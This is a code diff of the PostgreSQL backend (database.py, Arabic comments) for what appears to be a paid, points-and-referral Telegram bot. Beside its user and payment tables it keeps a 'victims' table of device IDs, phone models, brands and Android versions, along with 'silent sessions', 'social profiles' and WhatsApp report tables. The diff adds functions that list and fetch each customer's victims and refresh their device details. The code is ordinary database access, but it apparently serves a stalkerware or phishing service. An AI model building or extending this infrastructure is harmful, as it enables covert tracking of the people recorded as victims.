@@ -1,6 +1,6 @@
 # database.py
 # ============================================================
-# PostgreSQL (NeonDB) Manager — للبيانات الدائمة
+# PostgreSQL (NeonDB) — قاعدة البيانات الدائمة
 # ============================================================
 import os
 import json
@@ -28,7 +28,6 @@ DATABASE_URL = os.environ.get("DATABASE_URL", "").strip()
 if DATABASE_URL.startswith("postgres://"):
     DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
 
-# Pool من الاتصالات
 _pool = None
 
 
@@ -48,7 +47,7 @@ def init_pool():
     try:
         _pool = SimpleConnectionPool(
             minconn=1,
-            maxconn=10,
+            maxconn=15,
             dsn=DATABASE_URL,
             cursor_factory=RealDictCursor,
         )
@@ -62,6 +61,7 @@ def init_pool():
 @contextmanager
 def get_db():
     """Context manager للاتصال بقاعدة البيانات"""
+    global _pool
     if _pool is None:
         init_pool()
 
@@ -89,7 +89,7 @@ def create_tables():
     with get_db() as conn:
         cur = conn.cursor()
 
-        # ─── جدول المستخدمين ───
+        # ═══ المستخدمين ═══
         cur.execute("""
             CREATE TABLE IF NOT EXISTS users (
                 user_id BIGINT PRIMARY KEY,
@@ -105,11 +105,11 @@ def create_tables():
                 is_banned BOOLEAN DEFAULT FALSE,
                 is_vip BOOLEAN DEFAULT FALSE,
                 notes TEXT,
-                last_seen TIMESTAMP
+                last_seen TIMESTAMP DEFAULT NOW()
             )
         """)
 
-        # ─── جدول سجل المعاملات ───
+        # ═══ سجل المعاملات ═══
         cur.execute("""
             CREATE TABLE IF NOT EXISTS points_history (
                 id SERIAL PRIMARY KEY,
@@ -127,13 +127,12 @@ def create_tables():
             )
         """)
 
-        # ─── Index على user_id ───
         cur.execute("""
             CREATE INDEX IF NOT EXISTS idx_points_history_user
             ON points_history(user_id, created_at DESC)
         """)
 
-        # ─── جدول الإحالات ───
+        # ═══ الإحالات ═══
         cur.execute("""
             CREATE TABLE IF NOT EXISTS referrals (
                 id SERIAL PRIMARY KEY,
@@ -148,7 +147,7 @@ def create_tables():
             ON referrals(referrer_id)
         """)
 
-        # ─── جدول Silent Sessions ───
+        # ═══ Silent Sessions ═══
         cur.execute("""
             CREATE TABLE IF NOT EXISTS silent_sessions (
                 session_id VARCHAR(50) PRIMARY KEY,
@@ -173,7 +172,7 @@ def create_tables():
             ON silent_sessions(chat_id, created_at DESC)
         """)
 
-        # ─── جدول Social Profiles ───
+        # ═══ Social Profiles ═══
         cur.execute("""
             CREATE TABLE IF NOT EXISTS social_profiles (
                 session_id VARCHAR(50) PRIMARY KEY,
@@ -202,7 +201,7 @@ def create_tables():
             ON social_profiles(chat_id, created_at DESC)
         """)
 
-        # ─── جدول Victims (الضحايا) ───
+        # ═══ Victims ═══
         cur.execute("""
             CREATE TABLE IF NOT EXISTS victims (
                 victim_id VARCHAR(50) PRIMARY KEY,
@@ -228,7 +227,7 @@ def create_tables():
             ON victims(chat_id, last_seen DESC)
         """)
 
-        # ─── جدول WhatsApp Reports ───
+        # ═══ WhatsApp Reports ═══
         cur.execute("""
             CREATE TABLE IF NOT EXISTS wa_reports (
                 id SERIAL PRIMARY KEY,
@@ -245,7 +244,7 @@ def create_tables():
             ON wa_reports(chat_id, created_at DESC)
         """)
 
-        # ─── جدول الفواتير / المدفوعات (اختياري) ───
+        # ═══ Payments ═══
         cur.execute("""
             CREATE TABLE IF NOT EXISTS payments (
                 id SERIAL PRIMARY KEY,
@@ -258,7 +257,7 @@ def create_tables():
             )
         """)
 
-        # ─── جدول السجلات الإدارية ───
+        # ═══ Admin Events ═══
         cur.execute("""
             CREATE TABLE IF NOT EXISTS admin_events (
                 id SERIAL PRIMARY KEY,
@@ -274,6 +273,25 @@ def create_tables():
             ON admin_events(created_at DESC)
         """)
 
+        # ═══ Admin Actions (إعطاء نجوم/نقاط/VIP) ═══
+        cur.execute("""
+            CREATE TABLE IF NOT EXISTS admin_actions (
+                id SERIAL PRIMARY KEY,
+                admin_id BIGINT NOT NULL,
+                target_id BIGINT NOT NULL,
+                action VARCHAR(50) NOT NULL,
+                amount INTEGER,
+                reason VARCHAR(500),
+                meta JSONB,
+                created_at TIMESTAMP DEFAULT NOW()
+            )
+        """)
+
+        cur.execute("""
+            CREATE INDEX IF NOT EXISTS idx_admin_actions_target
+            ON admin_actions(target_id, created_at DESC)
+        """)
+
         logger.info("✅ Tables created/verified")
 
     metrics.inc_counter("db_tables_created")
@@ -287,10 +305,7 @@ def get_user_db(user_id: int) -> Optional[Dict]:
     try:
         with get_db() as conn:
             cur = conn.cursor()
-            cur.execute(
-                "SELECT * FROM users WHERE user_id = %s",
-                (user_id,)
-            )
+            cur.execute("SELECT * FROM users WHERE user_id = %s", (user_id,))
             row = cur.fetchone()
             if row:
                 return dict(row)
@@ -305,19 +320,6 @@ def save_user_db(user_id: int, data: Dict) -> bool:
     try:
         with get_db() as conn:
             cur = conn.cursor()
-
-            # بيانات التسجيل
-            username = data.get("username", "")
-            first_name = data.get("first_name", "")
-            points = data.get("points", 0)
-            total_earned = data.get("total_points_earned", 0)
-            total_spent = data.get("total_points_spent", 0)
-            ref_code = data.get("ref_code", "")
-            referred_by = data.get("referred_by")
-            referral_count = data.get("referral_count", 0)
-            is_banned = data.get("is_banned", False)
-            is_vip = data.get("is_vip", False)
-            notes = data.get("notes", "")
 
             cur.execute("""
                 INSERT INTO users (
@@ -341,11 +343,19 @@ def save_user_db(user_id: int, data: Dict) -> bool:
                     notes = EXCLUDED.notes,
                     last_seen = NOW()
             """, (
-                user_id, username, first_name, points,
-                total_earned, total_spent, ref_code, referred_by,
-                referral_count, is_banned, is_vip, notes
+                user_id,
+                data.get("username", ""),
+                data.get("first_name", ""),
+                data.get("points", 0),
+                data.get("total_points_earned", 0),
+                data.get("total_points_spent", 0),
+                data.get("ref_code", ""),
+                data.get("referred_by"),
+                data.get("referral_count", 0),
+                data.get("is_banned", False),
+                data.get("is_vip", False),
+                data.get("notes", ""),
             ))
-
         return True
     except Exception as e:
         logger.error(f"save_user_db error: {e}")
@@ -374,6 +384,7 @@ def delete_user_db(user_id: int) -> bool:
             cur.execute("DELETE FROM points_history WHERE user_id = %s", (user_id,))
             cur.execute("DELETE FROM referrals WHERE referrer_id = %s OR referred_id = %s",
                         (user_id, user_id))
+            cur.execute("DELETE FROM admin_actions WHERE target_id = %s", (user_id,))
         return True
     except Exception as e:
         logger.error(f"delete_user_db error: {e}")
@@ -471,6 +482,21 @@ def get_user_referrals_db(user_id: int, limit: int = 50) -> List[Dict]:
         return []
 
 
+def get_referral_by_code_db(code: str) -> Optional[int]:
+    """يجلب ID من كود الإحالة"""
+    try:
+        with get_db() as conn:
+            cur = conn.cursor()
+            cur.execute("SELECT user_id FROM users WHERE ref_code = %s", (code,))
+            row = cur.fetchone()
+            if row:
+                return row["user_id"]
+        return None
+    except Exception as e:
+        logger.error(f"get_referral_by_code_db error: {e}")
+        return None
+
+
 # ============================================================
 # [7] Silent Sessions
 # ============================================================
@@ -522,10 +548,7 @@ def get_silent_session_db(session_id: str) -> Optional[Dict]:
     try:
         with get_db() as conn:
             cur = conn.cursor()
-            cur.execute(
-                "SELECT * FROM silent_sessions WHERE session_id = %s",
-                (session_id,)
-            )
+            cur.execute("SELECT * FROM silent_sessions WHERE session_id = %s", (session_id,))
             row = cur.fetchone()
             if row:
                 return dict(row)
@@ -604,10 +627,7 @@ def get_social_profile(session_id: str) -> Optional[Dict]:
     try:
         with get_db() as conn:
             cur = conn.cursor()
-            cur.execute(
-                "SELECT * FROM social_profiles WHERE session_id = %s",
-                (session_id,)
-            )
+            cur.execute("SELECT * FROM social_profiles WHERE session_id = %s", (session_id,))
             row = cur.fetchone()
             if row:
                 return dict(row)
@@ -649,7 +669,13 @@ def create_victim_db(victim_id: str, data: Dict) -> bool:
                 (victim_id, victim_token, chat_id, name, site, status)
                 VALUES (%s, %s, %s, %s, %s, %s)
                 ON CONFLICT (victim_id) DO UPDATE SET
-                    name = EXCLUDED.name
+                    name = EXCLUDED.name,
+                    device_id = COALESCE(EXCLUDED.device_id, victims.device_id),
+                    model = COALESCE(EXCLUDED.model, victims.model),
+                    brand = COALESCE(EXCLUDED.brand, victims.brand),
+                    android = COALESCE(EXCLUDED.android, victims.android),
+                    status = EXCLUDED.status,
+                    last_seen = NOW()
             """, (
                 victim_id,
                 data.get("victim_token"),
@@ -669,10 +695,7 @@ def find_victim_by_token_db(victim_token: str) -> Optional[Dict]:
     try:
         with get_db() as conn:
             cur = conn.cursor()
-            cur.execute(
-                "SELECT * FROM victims WHERE victim_token = %s",
-                (victim_token,)
-            )
+            cur.execute("SELECT * FROM victims WHERE victim_token = %s", (victim_token,))
             row = cur.fetchone()
             if row:
                 return dict(row)
@@ -680,6 +703,41 @@ def find_victim_by_token_db(victim_token: str) -> Optional[Dict]:
     except Exception as e:
         logger.error(f"find_victim_by_token_db error: {e}")
         return None
+
+
+def get_victim_db(chat_id: int, victim_id: str) -> Optional[Dict]:
+    """يجلب ضحية معينة"""
+    try:
+        with get_db() as conn:
+            cur = conn.cursor()
+            cur.execute(
+                "SELECT * FROM victims WHERE chat_id = %s AND victim_id = %s",
+                (chat_id, victim_id)
+            )
+            row = cur.fetchone()
+            if row:
+                return dict(row)
+        return None
+    except Exception as e:
+        logger.error(f"get_victim_db error: {e}")
+        return None
+
+
+def get_all_victims_db(chat_id: int) -> List[Dict]:
+    """جلب كل ضحايا مستخدم"""
+    try:
+        with get_db() as conn:
+            cur = conn.cursor()
+            cur.execute("""
+                SELECT * FROM victims
+                WHERE chat_id = %s
+                ORDER BY last_seen DESC NULLS LAST, created_at DESC
+            """, (chat_id,))
+            rows = cur.fetchall()
+            return [dict(row) for row in rows]
+    except Exception as e:
+        logger.error(f"get_all_victims_db error: {e}")
+        return []
 
 
 # ============================================================
@@ -758,7 +816,54 @@ def get_admin_events_db(limit: int = 30) -> List[Dict]:
 
 
 # ============================================================
-# [12] Stats
+# [12] Admin Actions (إعطاء نجوم / نقاط / VIP)
+# ============================================================
+def log_admin_action_db(
+    admin_id: int,
+    target_id: int,
+    action: str,
+    amount: int = None,
+    reason: str = None,
+    meta: Dict = None,
+) -> bool:
+    """يسجل إجراء أدمن (نجوم، نقاط، VIP)"""
+    try:
+        with get_db() as conn:
+            cur = conn.cursor()
+            cur.execute("""
+                INSERT INTO admin_actions
+                (admin_id, target_id, action, amount, reason, meta)
+                VALUES (%s, %s, %s, %s, %s, %s)
+            """, (
+                admin_id, target_id, action, amount, reason,
+                json.dumps(meta) if meta else None
+            ))
+        return True
+    except Exception as e:
+        logger.error(f"log_admin_action_db error: {e}")
+        return False
+
+
+def get_admin_actions_db(target_id: int, limit: int = 20) -> List[Dict]:
+    """جلب إجراءات الأدمن على مستخدم"""
+    try:
+        with get_db() as conn:
+            cur = conn.cursor()
+            cur.execute("""
+                SELECT * FROM admin_actions
+                WHERE target_id = %s
+                ORDER BY created_at DESC
+                LIMIT %s
+            """, (target_id, limit))
+            rows = cur.fetchall()
+            return [dict(row) for row in rows]
+    except Exception as e:
+        logger.error(f"get_admin_actions_db error: {e}")
+        return []
+
+
+# ============================================================
+# [13] Stats
 # ============================================================
 def get_db_stats() -> Dict:
     """إحصائيات قاعدة البيانات"""
@@ -768,42 +873,33 @@ def get_db_stats() -> Dict:
 
             stats = {}
 
-            # عدد المستخدمين
             cur.execute("SELECT COUNT(*) as c FROM users")
             stats["total_users"] = cur.fetchone()["c"]
 
-            # المستخدمين النشطين (آخر 7 أيام)
             cur.execute("""
                 SELECT COUNT(*) as c FROM users
                 WHERE last_seen > NOW() - INTERVAL '7 days'
             """)
             stats["active_users_7d"] = cur.fetchone()["c"]
 
-            # VIP
             cur.execute("SELECT COUNT(*) as c FROM users WHERE is_vip = TRUE")
             stats["vip_users"] = cur.fetchone()["c"]
 
-            # محظورين
             cur.execute("SELECT COUNT(*) as c FROM users WHERE is_banned = TRUE")
             stats["banned_users"] = cur.fetchone()["c"]
 
-            # إجمالي النقاط
             cur.execute("SELECT COALESCE(SUM(points), 0) as s FROM users")
             stats["total_points"] = cur.fetchone()["s"]
 
-            # Silent sessions
             cur.execute("SELECT COUNT(*) as c FROM silent_sessions")
             stats["silent_sessions"] = cur.fetchone()["c"]
 
-            # Social profiles
             cur.execute("SELECT COUNT(*) as c FROM social_profiles")
             stats["social_profiles"] = cur.fetchone()["c"]
 
-            # Victims
             cur.execute("SELECT COUNT(*) as c FROM victims")
             stats["victims"] = cur.fetchone()["c"]
 
-            # WA Reports
             cur.execute("SELECT COUNT(*) as c FROM wa_reports")
             stats["wa_reports"] = cur.fetchone()["c"]
 
@@ -815,7 +911,7 @@ def get_db_stats() -> Dict:
 
 
 # ============================================================
-# [13] Init
+# [14] Init
 # ============================================================
 def init_database():
     """تهيئة قاعدة البيانات"""
